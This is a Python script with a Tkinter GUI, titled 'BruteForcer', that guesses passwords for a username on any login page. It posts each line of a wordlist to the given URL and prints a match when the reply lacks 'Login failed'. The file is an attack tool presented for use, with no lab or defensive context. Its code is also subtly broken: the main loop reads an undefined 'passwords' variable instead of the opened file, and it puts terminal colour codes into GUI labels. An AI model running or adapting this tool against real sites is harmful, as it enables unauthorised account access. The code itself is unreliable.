import requests
from termcolor import colored
import tkinter as tk
from tkinter import ttk, filedialog

def bruteforce(username, url):
    for password in passwords:
        password = password.strip('\n')
        print(colored("Trying Password: %s" % password, "yellow"))
        dataDict = {"username":username, "password":password, "Login":"submit"}
        response = requests.post(url, data=dataDict)
        if b"Login failed" in response.content:
            pass
        else:
            print(colored("[+] Username --> " + username, "green"))
            print(colored("[+] Password --> " + password, "green"))
            password_found_label.config(text=colored("[+] Password Found!", "green"))
            return

    result_label.config(text=colored("[-] Password Not Found in List", "red"))

def submit_credentials():
    username = username_entry.get()
    page_url = page_url_entry.get()
    
    with open(password_file_entry.get(), "r") as passwords_file:
        bruteforce(username, page_url)

def explore_file():
    filename = filedialog.askopenfilename(initialdir="/", title="Select Password File",
                                          filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    password_file_entry.delete(0, tk.END)
    password_file_entry.insert(0, filename)

root = tk.Tk()
root.title("BruteForcer")
root.tk_setPalette(background='#222222', foreground='#00ffff', activeBackground='#111111',
                  activeForeground='#222222', highlightColor='#00ffff', highlightBackground='#00ffff')

main_frame = tk.Frame(root, bg='#222222', padx=20, pady=20)
main_frame.pack()

username_label = tk.Label(main_frame, text="Enter Username:", bg='#222222', fg='#00ffff')
username_label.grid(row=0, column=0, sticky='w')

username_entry = tk.Entry(main_frame, bg='#4A4A4A', fg='#00f000', width=50)
username_entry.grid(row=0, column=1)

page_url_label = tk.Label(main_frame, text="Enter Page URL:", bg='#222222', fg='#00ffff')
page_url_label.grid(row=1, column=0, sticky='w')

page_url_entry = tk.Entry(main_frame, bg='#4A4A4A', fg='#00f000', width=50)
page_url_entry.grid(row=1, column=1)

password_file_label = tk.Label(main_frame, text="Select Password File:", bg='#222222', fg='#00ffff')
password_file_label.grid(row=2, column=0, sticky='w')

password_file_entry = tk.Entry(main_frame, bg='#4A4A4A', fg='#00f000', width=50)
password_file_entry.grid(row=2, column=1)

explore_button = tk.Button(main_frame, text="Explore", command=explore_file, bg='#f0f8ff', fg='#222222')
explore_button.grid(row=3, columnspan=1, pady=10)

submit_button = tk.Button(main_frame, text="Execute", command=submit_credentials, bg='#f0f8ff', fg='#222222')
submit_button.grid(row=3, column=1, pady=10)

password_found_label = tk.Label(main_frame, text="", bg='#222222', fg='#00ff00')
password_found_label.grid(row=4, columnspan=3)

result_label = tk.Label(main_frame, text="", bg='#222222', fg='#ff0000')
result_label.grid(row=5, columnspan=3)

statusbar = tk.Label(root, text="#################################################", fg='#A9A9A9', border=2)
statusbar.pack()
statusbar = tk.Label(root, text='Brute Force Login Tool | Attempts login to the URL specified', fg='#A9A9A9', bd=2)
statusbar.pack()
statusbar = tk.Label(root, text="Username & Password found will be printed to the console", fg='#A9A9A9', bd=2)
statusbar.pack()
statusbar = tk.Label(root, text="Script used to attempt to login to various types of login pages", fg='#A9A9A9', bd=2)
statusbar.pack()
statusbar = tk.Label(root, text="#################################################", fg='#A9A9A9', border=2)
statusbar.pack()

root.mainloop()
